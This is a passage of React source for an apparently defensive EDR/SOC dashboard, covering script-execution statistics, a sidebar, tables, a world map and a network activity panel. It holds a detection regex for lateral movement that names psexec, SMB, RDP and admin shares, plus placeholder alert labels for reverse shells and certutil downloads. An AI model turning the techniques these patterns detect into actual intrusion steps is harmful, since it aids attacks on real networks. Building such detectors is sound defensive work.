              <div style={{ padding: 12, display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8 }}>{[['Encoded Commands', '148', MON.red], ['Reverse Shells', '26', MON.red], ['Downloader Scripts', '67', MON.red], ['Persistence Scripts', '45', MON.green], ['Fileless Attacks', '33', MON.orange]].map(([l, v, c]) => <section key={l} style={{ border: `1px solid ${MON.line}`, borderRadius: 5, padding: 10, textAlign: 'center', background: '#071827' }}><span style={{ color: c, fontSize: 20 }}>⬢</span><b style={{ display: 'block', color: '#dbeafe', fontSize: 11, minHeight: 28 }}>{l}</b><strong style={{ color: '#f3f8ff', fontSize: 22 }}>{v}</strong><small style={{ display: 'block', color: MON.red }}>↑ 24.2%</small></section>)}</div>
            </Panel>
            <Panel title="Recent Alert Timeline" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="64px 1fr 65px" rows={[['14:32:18', 'Encoded PowerShell command detected on WIN-10-22-45', 'Critical'], ['14:21:09', 'Reverse shell detected from WEB-SRV-02', 'Critical'], ['14:15:44', 'Python script performing network scan', 'High'], ['13:58:33', 'Suspicious download via certutil', 'High'], ['13:42:11', 'Node.js script trying to execute child process', 'Medium']]} /></Panel>
            <Panel title="Script Executions by OS" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 12 }}><Donut value={58} label="12,458" color={MON.blue} accent={MON.green} /><BarList rows={[{ label: 'Windows', value: 7248, valueLabel: '7,248 (58.2%)', color: MON.blue }, { label: 'Linux', value: 4125, valueLabel: '4,125 (33.1%)', color: MON.green }, { label: 'macOS', value: 864, valueLabel: '864 (6.9%)', color: MON.yellow }, { label: 'Others', value: 221, valueLabel: '221 (1.8%)', color: MON.muted }]} /></div>
            </Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading script execution events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function SocDashboardShell({ kind = 'network', active, dataSources, dataSourceTitle = 'Data Sources', navBadges = {}, children }) {
  const navigate = useNavigate();
  const [navSystems, setNavSystems] = useState([]);
  const isAuth = /auth/i.test(active || '');
  const sidebarConfig = socDashboardSidebars[kind] || socDashboardSidebars[isAuth ? 'auth' : 'network'] || {};
  const hasConditionalItems = (sidebarConfig.nav || []).some(item => item.requiresServerAgent);
  useEffect(() => {
    if (!hasConditionalItems) return;
    let alive = true;
    api.get('/system')
      .then(r => {
        if (!alive) return;
        const list = r.data?.systems || r.data?.agents || r.data || [];
        setNavSystems(Array.isArray(list) ? list : []);
      })
      .catch(() => {
        if (alive) setNavSystems([]);
      });
    return () => { alive = false; };
  }, [hasConditionalItems]);
  const hasServerAgent = navSystems.some(system => {
    const text = `${system.name || ''} ${system.hostname || ''} ${system.role || ''} ${system.type || ''} ${system.assetType || ''} ${system.category || ''}`.toLowerCase();
    const installed = system.agentOk || system.isOnline || system.status || system.lastSeen;
    return installed && (system.isServer === true || /(^|[^a-z])(server|srv|dc|domain controller|database|db-server|web-server|app-server)([^a-z]|$)/.test(text));
  });
  const mainNav = (sidebarConfig.nav || []).filter(item => !item.requiresServerAgent || hasServerAgent);
  const sources = dataSources || sidebarConfig.dataSources || [];
  const activeLabel = active || sidebarConfig.activeLabel;
  const compact = Boolean(sidebarConfig.compact);
  const rail = Boolean(sidebarConfig.rail);
  const sidebarWidth = sidebarConfig.sidebarWidth || 210;
  const sourceSummary = sidebarConfig.dataSourceSummary;

  return (
    <div style={{ height: 'calc(100vh - 58px)', minHeight: 0, display: 'grid', gridTemplateColumns: `${sidebarWidth}px minmax(0,1fr)`, background: MON.bg, color: MON.text, overflow: 'hidden' }}>
      <aside style={{ borderRight: `1px solid ${MON.border}`, background: 'linear-gradient(180deg,#061427,#020914)', padding: rail ? '8px 5px' : compact ? '10px 6px' : '10px 8px', display: 'flex', flexDirection: 'column', minHeight: 0 }}>
        {!compact && (
          <div style={{ color: MON.muted, fontSize: 9, fontWeight: 900, textTransform: 'uppercase', margin: '0 4px 8px' }}>
            Main Navigation
          </div>
        )}
        <div style={{ display: 'grid', gap: rail ? 4 : compact ? 3 : 4, overflow: 'auto', minHeight: 0 }}>
          {mainNav.map(item => {
            const selected = item.label === activeLabel || item.id === activeLabel || item.id === active || (item.section && !isAuth && activeLabel === 'Network Activity');
            return (
              <button
                key={item.id || item.label}
                type="button"
                onClick={() => navigate(item.path || `/?capabilityId=${sidebarConfig.capabilityId || (isAuth ? 4 : 3)}`)}
                style={{
                  minHeight: rail ? 50 : compact ? 30 : 27,
                  border: selected ? (rail ? '1px solid rgba(37,99,235,.45)' : compact ? '1px solid rgba(37,99,235,.22)' : '1px solid rgba(37,99,235,.45)') : '1px solid transparent',
                  borderRadius: rail ? 4 : compact ? 5 : 4,
                  background: selected ? (rail ? 'linear-gradient(180deg,#1262c8,#0d4699)' : compact ? 'rgba(20,133,255,.14)' : 'linear-gradient(135deg,#1262c8,#0d4699)') : 'transparent',
                  color: selected ? '#fff' : '#b9c8dc',
                  padding: rail ? '6px 3px' : compact ? '0 8px' : '0 7px',
                  textAlign: rail ? 'center' : 'left',
                  fontSize: rail ? 8 : compact ? 10 : 10,
                  fontWeight: selected ? 900 : 750,
                  cursor: 'pointer',
                  fontFamily: 'inherit',
                  display: 'grid',
                  gridTemplateColumns: rail ? '1fr' : compact ? '17px minmax(0,1fr) auto' : '16px minmax(0,1fr) auto',
                  gridTemplateRows: rail ? '18px 1fr' : undefined,
                  gap: rail ? 3 : 6,
                  alignItems: 'center',
                  justifyItems: rail ? 'center' : undefined,
                  textTransform: rail ? 'uppercase' : undefined,
                }}
              >
                <span style={{ color: selected ? '#dbeafe' : '#8092aa', fontSize: rail ? 14 : compact ? 13 : 10, textAlign: 'center', lineHeight: 1 }}>{item.icon || '•'}</span>
                <span style={{ minWidth: 0, maxWidth: '100%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', lineHeight: rail ? 1.1 : undefined }}>{item.label}</span>
                {(navBadges[item.id] ?? item.badge) ? <span style={{ background: MON.red, color: '#fff', borderRadius: 99, padding: '1px 5px', fontSize: 8, fontWeight: 950 }}>{navBadges[item.id] ?? item.badge}</span> : null}
              </button>
            );
          })}
        </div>

        {(sources.length > 0 || sourceSummary) && (
          <div style={{ marginTop: 'auto', paddingTop: 12 }}>
            <div style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'rgba(10,25,48,.84)', padding: compact ? 10 : 0 }}>
              <div style={{ color: compact ? '#dbeafe' : MON.muted, fontSize: 9, fontWeight: 900, textTransform: compact ? 'none' : 'uppercase', margin: compact ? '0 0 6px' : '0 4px 8px' }}>
                {dataSourceTitle}
              </div>
              {sourceSummary && (
                <>
                  <div style={{ color: MON.green, fontSize: 9, fontWeight: 900, marginBottom: 5 }}>• {sourceSummary.label}</div>
                  <div style={{ color: MON.green, fontSize: 22, lineHeight: 1, fontWeight: 950, marginBottom: 10 }}>{sourceSummary.value}</div>
                </>
              )}
              <div style={{ display: 'grid', gap: compact ? 4 : 6, color: MON.muted, fontSize: 9, lineHeight: 1.45 }}>
                {sources.map(([label, status]) => {
                  const warning = /warn/i.test(status);
                  const online = /online|active/i.test(status);
                  return (
                    <div key={label} style={{ display: 'flex', justifyContent: 'space-between', gap: 8, color: '#cbd5e1', fontSize: 9 }}>
                      <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{label}</span>
                      {!compact && <b style={{ color: warning ? MON.yellow : online ? MON.green : MON.muted }}>{status}</b>}
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        )}
      </aside>
      <main style={{ minWidth: 0, minHeight: 0, overflow: 'auto' }}>
        {children}
      </main>
    </div>
  );
}

function SocMiniTable({ columns, rows, widths, empty = 'No records found.', compact = false }) {
  const grid = widths || columns.map(() => '1fr').join(' ');
  return (
    <div style={{ overflowX: compact ? 'hidden' : 'auto', overflowY: 'hidden' }}>
      <div style={{ minWidth: compact ? 0 : 520, width: '100%' }}>
        <div style={{ display: 'grid', gridTemplateColumns: grid, gap: 8, padding: '8px 10px', color: MON.muted, fontSize: 9, fontWeight: 950, textTransform: 'uppercase', borderBottom: `1px solid ${MON.line}` }}>
          {columns.map(col => <span key={col.key}>{col.label}</span>)}
        </div>
        {rows.length ? rows.map((row, index) => (
          <div key={row.id || index} style={{ display: 'grid', gridTemplateColumns: grid, gap: 8, alignItems: 'center', padding: '8px 10px', color: MON.text, fontSize: 10, borderBottom: `1px solid ${MON.line}` }}>
            {columns.map(col => (
              <span key={col.key} style={{ minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', color: col.color ? col.color(row, index) : undefined, fontWeight: col.bold ? 900 : 650 }}>
                {col.render ? col.render(row, index) : row[col.key]}
              </span>
            ))}
          </div>
        )) : <div style={{ padding: 14, color: MON.muted, fontSize: 11 }}>{empty}</div>}
      </div>
    </div>
  );
}

const AUTH_COUNTRY_MAP_POINTS = {
  IN: ['70%', '52%'], INDIA: ['70%', '52%'],
  US: ['19%', '43%'], USA: ['19%', '43%'], 'UNITED STATES': ['19%', '43%'],
  CA: ['18%', '29%'], CANADA: ['18%', '29%'],
  MX: ['24%', '55%'], MEXICO: ['24%', '55%'],
  BR: ['34%', '68%'], BRAZIL: ['34%', '68%'],
  GB: ['46%', '34%'], UK: ['46%', '34%'], 'UNITED KINGDOM': ['46%', '34%'],
  FR: ['48%', '43%'], FRANCE: ['48%', '43%'],
  DE: ['51%', '38%'], GERMANY: ['51%', '38%'],
  ES: ['47%', '48%'], SPAIN: ['47%', '48%'],
  RU: ['65%', '28%'], RUSSIA: ['65%', '28%'],
  CN: ['78%', '44%'], CHINA: ['78%', '44%'],
  JP: ['88%', '44%'], JAPAN: ['88%', '44%'],
  AU: ['84%', '70%'], AUSTRALIA: ['84%', '70%'],
  SG: ['77%', '61%'], SINGAPORE: ['77%', '61%'],
  AE: ['63%', '50%'], UAE: ['63%', '50%'], 'UNITED ARAB EMIRATES': ['63%', '50%'],
  PK: ['67%', '50%'], PAKISTAN: ['67%', '50%'],
  BD: ['73%', '53%'], BANGLADESH: ['73%', '53%'],
  ZA: ['53%', '73%'], 'SOUTH AFRICA': ['53%', '73%'],
};

function authLocationMapPoints(rows = []) {
  const max = Math.max(...rows.map(row => Number(row.value || 0)), 1);
  return rows.map((row, index) => {
    const key = String(row.country || '').trim().toUpperCase();
    const coordinates = AUTH_COUNTRY_MAP_POINTS[key];
    if (!coordinates) return null;
    const color = [MON.red, MON.orange, MON.yellow, MON.green, MON.blue, MON.purple][index % 6];
    const size = Math.round(9 + (Number(row.value || 0) / max) * 12);
    return [...coordinates, color, size];
  }).filter(Boolean);
}

function SocWorldMap({ auth = false, height = 190, points: suppliedPoints, emptyLabel = '' }) {
  const hasSuppliedPoints = Array.isArray(suppliedPoints);
  const points = hasSuppliedPoints ? suppliedPoints : auth
    ? [['18%', '49%', MON.red, 22], ['54%', '39%', MON.yellow, 12], ['68%', '47%', MON.orange, 20], ['74%', '55%', MON.green, 11], ['84%', '62%', MON.blue, 10], ['80%', '42%', MON.green, 12]]
    : [['18%', '52%', MON.green, 18], ['49%', '39%', MON.yellow, 13], ['67%', '44%', MON.orange, 18], ['82%', '48%', MON.red, 20], ['76%', '61%', MON.red, 12], ['31%', '66%', MON.green, 9]];
  const arcs = hasSuppliedPoints ? [] : auth
    ? [['18%', '49%', '68%', '47%', MON.red], ['54%', '39%', '80%', '42%', MON.yellow], ['74%', '55%', '84%', '62%', MON.green]]
    : [['18%', '52%', '82%', '48%', MON.red], ['31%', '66%', '67%', '44%', MON.orange], ['49%', '39%', '76%', '61%', MON.yellow]];

  return (
    <div style={{ position: 'relative', height, background: 'radial-gradient(circle at 52% 45%, rgba(20,133,255,.18), transparent 38%), linear-gradient(180deg, rgba(7,22,45,.88), rgba(5,13,25,.98))', overflow: 'hidden' }}>
      <svg viewBox="0 0 620 240" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}>
        <path d="M64 91 C116 49 179 57 219 86 C267 122 331 75 389 84 C449 94 482 125 562 98" fill="none" stroke="rgba(46,151,255,.22)" strokeWidth="34" strokeLinecap="round" />
        <path d="M78 143 C152 127 195 151 254 136 C335 116 392 136 462 128 C511 123 548 138 584 160" fill="none" stroke="rgba(46,151,255,.16)" strokeWidth="29" strokeLinecap="round" />
        <path d="M139 71 C184 72 209 101 180 123 C144 145 101 124 112 95 C116 84 126 76 139 71Z" fill="rgba(47,95,135,.45)" />
        <path d="M294 73 C347 56 404 68 437 94 C401 110 345 112 302 101Z" fill="rgba(47,95,135,.42)" />
        <path d="M456 117 C503 111 557 129 588 158 C548 178 492 165 462 144Z" fill="rgba(47,95,135,.38)" />
        {arcs.map(([x1, y1, x2, y2, color], i) => (
          <path key={i} d={`M ${parseFloat(x1) * 6.2} ${parseFloat(y1) * 2.4} C 250 ${54 + i * 18}, 372 ${38 + i * 10}, ${parseFloat(x2) * 6.2} ${parseFloat(y2) * 2.4}`} fill="none" stroke={color} strokeWidth="2" opacity=".9" />
        ))}
      </svg>
      {points.map(([x, y, color, size], i) => (
        <span key={i} style={{ position: 'absolute', left: x, top: y, width: size, height: size, transform: 'translate(-50%,-50%)', borderRadius: '50%', background: color, boxShadow: `0 0 22px ${color}`, border: '2px solid rgba(255,255,255,.42)', opacity: .9 }} />
      ))}
      {hasSuppliedPoints && !points.length && emptyLabel && (
        <div style={{ position: 'absolute', inset: 0, display: 'grid', placeItems: 'center', padding: 18, color: MON.muted, fontSize: 11, fontWeight: 800, textAlign: 'center', background: 'rgba(4,13,26,.28)' }}>
          {emptyLabel}
        </div>
      )}
    </div>
  );
}

function TinyLegend({ rows }) {
  return (
    <div style={{ display: 'grid', gap: 7, padding: '4px 10px 12px' }}>
      {rows.map(([label, value, color]) => (
        <div key={label} style={{ display: 'grid', gridTemplateColumns: '1fr auto', gap: 10, alignItems: 'center', color: MON.text, fontSize: 10 }}>
          <span><b style={{ color }}>●</b> {label}</span>
          <b style={{ color }}>{value}</b>
        </div>
      ))}
    </div>
  );
}

// 🛡️ 3. Network Activity Monitoring popup UI
function NetworkActivityDashboardPanel({ alerts = [], systems = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const rows = sorted.slice(0, 8);
  const [selectedNetwork, setSelectedNetwork] = useState(null);
  const internalTab = searchParams.get('networkTab') || 'overview';
  if (internalTab !== 'overview') {
    return <Navigate to={`/edr-dashboard-details/network/${internalTab}`} replace />;
  }
  const totalEvents = total || alerts.length;
  const blocked = alerts.filter(a => a.blocked || a.actionTaken === 'Blocked' || a.containmentStatus === 'blocked').length;
  const inbound = alerts.filter(a => a.direction === 'inbound' || a.inbound === true).length;
  const outbound = alerts.filter(a => a.direction === 'outbound' || a.inbound === false).length;
  const netRaw = (a = {}) => a.rawEvent?.raw || a.rawEvent?.fields || a.rawEvent || a.raw || {};
  const netPeer = (a = {}) => {
    const raw = netRaw(a);
    return raw.external_peers?.[0] || raw.reputation_candidates?.[0] || {};
  };
  const netVpn = (a = {}) => {
    const raw = netRaw(a);
    return raw.vpn || raw.vpn_state || {};
  };
  const netSrc = (a = {}) => {
    const raw = netRaw(a);
    const peer = netPeer(a);
    return a.srcip || a.src_ip || a.sourceIp || a.rawEvent?.srcip || a.rawEvent?.src_ip || a.rawEvent?.ipAddress || raw.srcip || raw.src_ip || raw.sourceIp || raw.clientIp || peer.remote_ip || peer.local_ip || '—';
  };
  const netDest = (a = {}) => {
    const raw = netRaw(a);
    const peer = netPeer(a);
    return a.destip || a.dstip || a.dest_ip || a.destinationIp || a.rawEvent?.destip || a.rawEvent?.dstip || a.rawEvent?.dest_ip || a.rawEvent?.dst_ip || a.rawEvent?.destination_ip || raw.destip || raw.dstip || raw.dest_ip || raw.dst_ip || raw.destination_ip || raw.serverIp || peer.local_ip || peer.remote_ip || '—';
  };
  const isPrivateIp = (ip = '') => {
    const value = String(ip).trim().toLowerCase();
    if (!value || value === '—') return false;
    if (value === 'localhost' || value === '::1' || value.startsWith('::ffff:127.') || value.startsWith('fe80:') || value.startsWith('fc') || value.startsWith('fd')) return true;
    const parts = value.split('.').map(Number);
    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return false;
    return parts[0] === 10 || parts[0] === 127 || (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) || (parts[0] === 192 && parts[1] === 168) || (parts[0] === 169 && parts[1] === 254);
  };
  const countryDisplay = (value = '') => {
    const code = String(value || '').trim();
    if (!code) return '';
    if (code.length === 2) {
      try {
        return new Intl.DisplayNames(['en'], { type: 'region' }).of(code.toUpperCase()) || code.toUpperCase();
      } catch {
        return code.toUpperCase();
      }
    }
    return code;
  };
  const netCountry = (a = {}, ip = '') => {
    const raw = netRaw(a);
    const peer = netPeer(a);
    const country = a.geoCountryName || a.countryName || a.geoCountry || a.country || a.rawEvent?.geoCountryName || a.rawEvent?.countryName || a.rawEvent?.geoCountry || a.rawEvent?.country || raw.geoCountryName || raw.countryName || raw.geoCountry || raw.country || raw.countryCode || raw.country_code || peer.country || peer.countryCode || peer.country_code;
    if (country) return countryDisplay(country);
    return isPrivateIp(ip) ? 'Private/Internal' : 'Geo pending';
  };
  const suspiciousIps = new Set(alerts.map(netSrc).filter(ip => ip && ip !== '—')).size;
  const highThreats = alerts.filter(a => ['critical', 'high'].includes((a.severity || '').toLowerCase())).length;
  const protocols = groupCounts(alerts, a => (a.protocol || a.rawEvent?.protocol || 'unknown').toString().toUpperCase(), 6);
  const sourceIps = groupCounts(alerts, netSrc, 5);
  const destIps = groupCounts(alerts, netDest, 5);
  const geos = groupCounts(alerts, a => netCountry(a, netDest(a)), 6);
  const trafficSeries = hourlySeriesFromAlerts(alerts);
  const outboundSeries = hourlySeriesFromAlerts(alerts.filter(a => a.direction === 'outbound' || a.inbound === false));
  const threatAlerts = sorted.filter(a => ['critical', 'high', 'medium'].includes((a.severity || '').toLowerCase())).slice(0, 5);
  const fmtPort = (a) => {
    const raw = netRaw(a);
    const peer = netPeer(a);
    return a.destPort || a.port || a.rawEvent?.dest_port || raw.destPort || raw.dest_port || raw.port || peer.remote_port || peer.local_port || '—';
  };
  const actionLabel = (a) => a.actionTaken || (a.blocked ? 'Blocked' : a.status === 'resolved' ? 'Resolved' : 'Monitored');
  const netHost = (a) => a.agentName || a.hostname || a.host || a.systemId?.name || a.rawEvent?.hostname || a.rawEvent?.host || '—';
  const netUser = (a) => a.username || a.user || a.rawEvent?.username || a.rawEvent?.user || netRaw(a).user || a.agentName || a.hostname || a.systemId?.name || '—';
  const monitoredSystems = new Set(alerts.map(a => a.agentName || a.hostname || a.host || a.systemId?.name || a.systemId?._id || netSrc(a)).filter(Boolean));
  const realSystems = systems.filter(Boolean);
  const onlineSystemRows = realSystems.filter(s => s.agentOk || s.isOnline || String(s.status || '').toLowerCase() === 'online' || s.lastSeen);
  const totalAgents = realSystems.length || monitoredSystems.size || 0;
  const onlineAgents = realSystems.length ? onlineSystemRows.length : totalAgents;
  const offlineAgents = Math.max(0, totalAgents - onlineAgents);
  const onlinePct = totalAgents ? Math.round((onlineAgents / totalAgents) * 100) : 0;
  const onlineAngle = totalAgents ? Math.round((onlineAgents / totalAgents) * 360) : 0;
  const selectedLog = selectedNetwork || rows[0] || null;
  const selectedAction = selectedLog ? actionLabel(selectedLog) : '';
  const topHosts = groupCounts(alerts, a => netHost(a), 5);
  const hostRows = topHosts.length ? topHosts : realSystems.slice(0, 5).map(system => ({ label: system.name || system.hostname || system.agentName || 'agent', value: 0 }));
  const processRows = groupCounts(alerts, a => a.processName || a.rawEvent?.processName || a.rawEvent?.process || a.agentName, 5);
  const portRows = groupCounts(alerts, a => fmtPort(a), 5).filter(r => r.label && r.label !== '—');
  const lateralRows = alerts
    .filter(a => /smb|rdp|psexec|lateral|admin share|445|3389/i.test(`${a.protocol || ''} ${fmtPort(a)} ${a.description || ''} ${a.ruleId || ''}`))
    .slice(0, 5);
  const suspiciousRows = (threatAlerts.length ? threatAlerts : rows).slice(0, 5);
  const recentAlertRows = (threatAlerts.length ? threatAlerts : rows).slice(0, 5);
  const dnsEvents = alerts.filter(a => /dns|domain|query/i.test(`${a.ruleId || ''} ${a.description || ''} ${JSON.stringify(a.rawEvent || {})}`)).length;
  const vpnRows = alerts
    .map(netVpn)
    .filter(vpn => vpn && (vpn.active || (vpn.interfaces || []).length || (vpn.processes || []).length || (vpn.ports || []).length));
  const vpnActive = vpnRows.length > 0;
  const vpnMethods = [...new Set(vpnRows.map(vpn => vpn.method || 'VPN').filter(Boolean))];
  const vpnLabel = vpnActive ? (vpnMethods[0] || 'VPN active') : 'inactive';
  const networkSidebarBadges = {
    overview: totalEvents || '',
    activity: totalEvents || '',
    connections: rows.length || '',
    dns: dnsEvents || '',
    'vpn-logs': vpnRows.length || '',
    'threat-intelligence': highThreats || '',
    vulnerabilities: highThreats || '',
    reports: totalEvents ? Math.ceil(totalEvents / 100) : '',
  };
  const networkDataSources = [
    ['Network Agent', loading ? 'Syncing' : onlineAgents ? 'Online' : 'No Data'],
    ['VPN Usage', loading ? 'Syncing' : vpnActive ? 'Online' : 'Waiting'],
    ['Firewall Logs', alerts.length ? 'Online' : 'Waiting'],
    ['DNS Logs', dnsEvents ? 'Online' : 'Waiting'],
    ['Proxy Logs', outbound ? 'Online' : 'Waiting'],
  ];

  return (
    <SocDashboardShell kind="network" navBadges={networkSidebarBadges} dataSources={networkDataSources}>
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1160, display: 'grid', gap: 8 }}>
          <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'center' }}>
            <NetworkCapabilityActions />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            <MonitorKpi icon="⛓" title="Total Connections" value={shortNum(totalEvents)} change="live" color={MON.blue} data={trafficSeries} />
            <MonitorKpi icon="▣" title="Active Endpoints" value={shortNum(totalAgents)} change="live" color={MON.green} data={trafficSeries.map(v => Math.max(0, v * .45))} />
            <MonitorKpi icon="▤" title="Active Servers" value="0" change="no server agent" color={MON.purple} data={trafficSeries.map(() => 0)} />
            <MonitorKpi icon="🌐" title="External Connections" value={shortNum(outbound)} change="live" color={MON.orange} data={outboundSeries} />
            <MonitorKpi icon="⌁" title="VPN Sessions" value={vpnActive ? shortNum(vpnRows.length) : '0'} change={vpnLabel} color={vpnActive ? MON.cyan : MON.muted} data={trafficSeries.map(v => vpnActive ? Math.max(1, v * .2) : 0)} />
            <MonitorKpi icon="⬟" title="Suspicious Connections" value={shortNum(highThreats)} change="live" color={MON.red} danger data={hourlySeriesFromAlerts(alerts.filter(a => severityRank(a.severity) >= 2))} />
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr 1fr .9fr', gap: 8 }}>
            <MonitorPanel title="LIVE NETWORK CONNECTIONS">
              <div style={{ position: 'relative' }}>
                <SocWorldMap height={205} />
                <div style={{ position: 'absolute', left: 12, top: 28, display: 'grid', gap: 10, fontSize: 10, fontWeight: 900 }}>
                  <span><b style={{ color: MON.green }}>●</b> Internal<br /><strong style={{ color: MON.text, fontSize: 15 }}>{shortNum(inbound)}</strong></span>
                  <span><b style={{ color: MON.orange }}>●</b> External<br /><strong style={{ color: MON.text, fontSize: 15 }}>{shortNum(outbound)}</strong></span>
                  <span><b style={{ color: MON.cyan }}>●</b> VPN<br /><strong style={{ color: vpnActive ? MON.cyan : MON.muted, fontSize: 15 }}>{vpnActive ? vpnLabel : 'Inactive'}</strong></span>
                  <span><b style={{ color: MON.red }}>●</b> Suspicious<br /><strong style={{ color: MON.red, fontSize: 15 }}>{shortNum(highThreats)}</strong></span>
                </div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="TOP TALKING HOSTS">
              <SocMiniTable
                columns={[
                  { key: 'host', label: 'Host', bold: true },
                  { key: 'type', label: 'Type' },
                  { key: 'connections', label: 'Connections' },
                  { key: 'sent', label: 'Sent' },
                  { key: 'received', label: 'Received' },
                ]}
                widths="1.25fr .7fr .8fr .65fr .75fr"
                rows={hostRows.map((r) => ({
                  host: r.label,
                  type: 'Endpoint',
                  connections: shortNum(r.value),
                  sent: 'live',
                  received: 'live',
                }))}
              />
            </MonitorPanel>
            <MonitorPanel title="TOP EXTERNAL IPs">
              <SocMiniTable
                columns={[
                  { key: 'ip', label: 'IP Address', bold: true },
                  { key: 'country', label: 'Country' },
                  { key: 'connections', label: 'Connections', color: () => MON.red },
                ]}
                widths="1fr 1fr .8fr"
                rows={destIps.map((r) => {
                  const match = alerts.find(a => netDest(a) === r.label) || {};
                  return {
                    ip: r.label,
                    country: netCountry(match, r.label),
                    connections: shortNum(r.value),
                  };
                })}
              />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.72fr .72fr 1.05fr .82fr', gap: 8 }}>
            <MonitorPanel title="PROTOCOL DISTRIBUTION">
              <div style={{ display: 'grid', gridTemplateColumns: '140px 1fr', alignItems: 'center', minHeight: 157 }}>
                <Donut value={totalEvents ? 73 : 0} label={shortNum(totalEvents)} color={MON.blue} accent={MON.green} />
                <TinyLegend rows={protocols.map((r, i) => [r.label, r.value, [MON.blue, MON.green, MON.yellow, MON.red, MON.muted][i]])} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="CONNECTION STATUS">
              <div style={{ display: 'grid', gridTemplateColumns: '140px 1fr', alignItems: 'center', minHeight: 157 }}>
                <Donut value={totalEvents ? 78 : 0} label={shortNum(totalEvents)} color={MON.green} accent={MON.yellow} />
                <TinyLegend rows={[
                  ['Established', shortNum(Math.max(0, totalEvents - blocked)), MON.green],
                  ['Listening', shortNum(inbound), MON.blue],
                  ['Time Wait', shortNum(outbound), MON.yellow],
                  ['Close Wait', shortNum(blocked), MON.red],
                  ['Other', shortNum(0), MON.muted],
                ]} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="DATA TRANSFER (Total)">
              <div style={{ padding: 12, height: 146, backgroundImage: 'linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px)', backgroundSize: '58px 34px' }}>
                <svg viewBox="0 0 480 140" width="100%" height="100%" preserveAspectRatio="none">
                  <polyline points={trafficSeries.map((v, i) => `${(i / 23) * 480},${126 - (v / Math.max(...trafficSeries, 1)) * 96}`).join(' ')} fill="none" stroke={MON.blue} strokeWidth="3" />
                  <polyline points={outboundSeries.map((v, i) => `${(i / 23) * 480},${126 - (v / Math.max(...outboundSeries, 1)) * 75}`).join(' ')} fill="none" stroke={MON.green} strokeWidth="3" />
                </svg>
                <div style={{ display: 'flex', gap: 18, fontSize: 10, fontWeight: 900 }}>
                  <span style={{ color: MON.green }}>● Upload live</span>
                  <span style={{ color: MON.blue }}>● Download live</span>
                </div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="DNS QUERIES">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 140px', alignItems: 'center', padding: '8px 12px', minHeight: 146 }}>
                <div>
                  <div style={{ color: MON.muted, fontSize: 10, fontWeight: 900 }}>Total Queries</div>
                  <strong style={{ color: MON.text, fontSize: 25 }}>{shortNum(dnsEvents)}</strong>
                  <div style={{ color: MON.green, fontSize: 10, fontWeight: 900 }}>Live agent data</div>
                </div>
                <Donut value={dnsEvents ? 65 : 0} label="" color={MON.green} accent={MON.red} />
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
            <MonitorPanel title="SUSPICIOUS CONNECTIONS">
              <SocMiniTable
                columns={[
                  { key: 'time', label: 'Time', color: () => MON.red },
                  { key: 'endpoint', label: 'Endpoint', bold: true },
                  { key: 'destination', label: 'Destination IP' },
                  { key: 'port', label: 'Port' },
                  { key: 'protocol', label: 'Protocol' },
                  { key: 'process', label: 'Process' },
                  { key: 'threat', label: 'Threat Info', color: () => MON.red, bold: true },
                ]}
                widths=".75fr 1fr 1fr .5fr .65fr .9fr .9fr"
                rows={suspiciousRows.map((a, i) => ({
                  time: a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '—',
                  endpoint: netHost(a),
                  destination: netDest(a),
                  port: fmtPort(a),
                  protocol: a.protocol || 'TCP',
                  process: a.processName || a.rawEvent?.processName || '—',
                  threat: a.description || a.ruleId || 'Network event',
                }))}
              />
            </MonitorPanel>
            <MonitorPanel title="RECENT ALERTS">
              <SocMiniTable
                columns={[
                  { key: 'time', label: 'Time' },
                  { key: 'alert', label: 'Alert Name', bold: true },
                  { key: 'severity', label: 'Severity', color: row => row.severityColor, bold: true },
                  { key: 'source', label: 'Source' },
                ]}
                widths=".75fr 1.8fr .75fr 1fr"
                rows={recentAlertRows.map((a, i) => ({
                  time: a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '—',
                  alert: a.description || a.ruleId || 'Network event',
                  severity: a.severity || 'low',
                  severityColor: severityRank(a.severity) >= 3 ? MON.red : MON.yellow,
                  source: netHost(a),
                }))}
              />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr .72fr 1fr', gap: 8 }}>
            <MonitorPanel title="PROCESS NETWORK ACTIVITY (Top 5)">
